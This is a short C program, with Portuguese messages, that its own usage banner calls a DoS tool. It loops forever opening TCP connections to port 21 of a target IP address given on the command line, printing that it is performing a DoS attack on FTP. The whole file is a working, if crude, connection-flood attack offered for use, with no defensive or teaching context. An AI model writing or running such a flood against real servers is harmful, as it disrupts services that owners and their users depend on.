#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main(int argc, char *argv[]){
	if(argc < 2){
		printf("======================================\n");
		printf("============= Modo de uso ============\n");
		printf("==        ./DoS 192.168.1.24        ==\n");
		printf("======================================\n");
		return 0;
	}
	int mysocket;

	int port=21;
	char *destiny;
	destiny = argv[1];

	struct sockaddr_in target;

	printf("Varrendo host %s\n", destiny);
	while(1){

		mysocket = socket(AF_INET, SOCK_STREAM, 0);

		target.sin_family = AF_INET;
		target.sin_port = htons(port);
		target.sin_addr.s_addr = inet_addr(destiny);

		connect(mysocket, (struct sockaddr *)&target, sizeof target);
		printf("Realizando ataque DoS no FTP\n");
	}

	return 0;
}
